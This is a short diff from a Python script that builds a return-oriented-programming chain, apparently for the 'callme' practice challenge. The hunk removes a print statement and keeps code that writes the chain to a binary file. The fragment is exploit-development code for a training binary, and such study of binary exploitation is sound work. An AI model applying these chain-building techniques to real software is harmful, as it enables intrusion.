@@ -241,8 +241,6 @@ ROP_Chain += callme_one + pop3words + params
 ROP_Chain += callme_two + pop3words + params
 ROP_Chain += callme_three + pop3words + params
 
-print(ROP_Chain)
-
 # Saving the chain in a binary file
 with open("rop_chain", "wb") as f:
     f.write(ROP_Chain)
